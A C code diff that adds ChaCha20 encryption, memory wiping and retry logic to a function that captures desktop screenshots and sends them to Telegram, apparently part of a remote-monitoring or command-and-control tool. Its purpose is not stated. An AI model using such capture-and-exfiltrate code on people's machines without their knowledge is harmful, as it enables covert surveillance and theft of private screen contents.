@@ -144,6 +144,8 @@ static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
   }
 }
 
+#include "../crypto/crypto.h"
+
 int screenshot_capture_and_send(const char *caption) {
   void *image_data = nullptr;
   size_t image_size = 0;
@@ -173,16 +175,70 @@ int screenshot_capture_and_send(const char *caption) {
              "🖥️ Desktop Screenshot [%s]", time_str);
   }
 
-  int send_res = telegram_send_file(image_data, image_size, mime_type, filename, &source);
+  unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
+  if (!c2t_crypto_get_random_bytes(nonce, sizeof(nonce))) {
+    c2t_log_error("screenshot", "Failed to generate random crypto nonce for screenshot");
+    c2t_secure_zero(image_data, image_size);
+    screenshot_free_data(image_data);
+    return 0;
+  }
+
+  void *encrypted_data = malloc(image_size);
+  if (!encrypted_data) {
+    c2t_log_error("screenshot", "Out of memory allocating encrypted screenshot buffer (%zu bytes)", image_size);
+    c2t_secure_zero(image_data, image_size);
+    screenshot_free_data(image_data);
+    return 0;
+  }
+
+  if (!c2t_crypto_encrypt(image_data, image_size, nonce, encrypted_data)) {
+    c2t_log_error("screenshot", "ChaCha20 encryption failed for screenshot");
+    c2t_secure_zero(image_data, image_size);
+    screenshot_free_data(image_data);
+    free(encrypted_data);
+    return 0;
+  }
+
+  /* Securely wipe plaintext screenshot buffer from RAM immediately */
+  c2t_secure_zero(image_data, image_size);
   screenshot_free_data(image_data);
+
+  size_t attempts = c2t_config_get()->delivery_attempts;
+  if (attempts == 0) attempts = 1;
+  size_t retry_delay_ms = c2t_config_get()->retry_delay_ms;
+  if (retry_delay_ms == 0) retry_delay_ms = 500;
+
+  int send_res = 0;
+  for (size_t attempt = 1; attempt <= attempts; ++attempt) {
+    send_res = telegram_send_encrypted_file(encrypted_data, image_size, nonce,
+                                           mime_type, filename, &source);
+    if (send_res) {
+      break;
+    }
+    if (attempt < attempts) {
+      c2t_log_warning("screenshot", "Delivery attempt %zu/%zu failed, retrying...",
+                      attempt, attempts);
+#ifdef _WIN32
+      Sleep((DWORD)(retry_delay_ms * attempt));
+#else
+      size_t delay = retry_delay_ms * attempt;
+      struct timespec ts = {.tv_sec = (time_t)(delay / 1000),
+                            .tv_nsec = (long)(delay % 1000) * 1000000L};
+      nanosleep(&ts, nullptr);
+#endif
+    }
+  }
+
+  c2t_secure_zero(encrypted_data, image_size);
+  free(encrypted_data);
 
   if (send_res) {
     atomic_fetch_add_explicit(&total_captures, 1, memory_order_relaxed);
     atomic_fetch_add_explicit(&total_bytes, image_size, memory_order_relaxed);
-    c2t_log_info("screenshot", "Screenshot successfully delivered (%zu bytes)", image_size);
+    c2t_log_info("screenshot", "Screenshot successfully delivered via encrypted stream (%zu bytes)", image_size);
     return 1;
   } else {
-    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram");
+    c2t_log_warning("screenshot", "Failed to deliver screenshot to Telegram after %zu attempts", attempts);
     return 0;
   }
 }
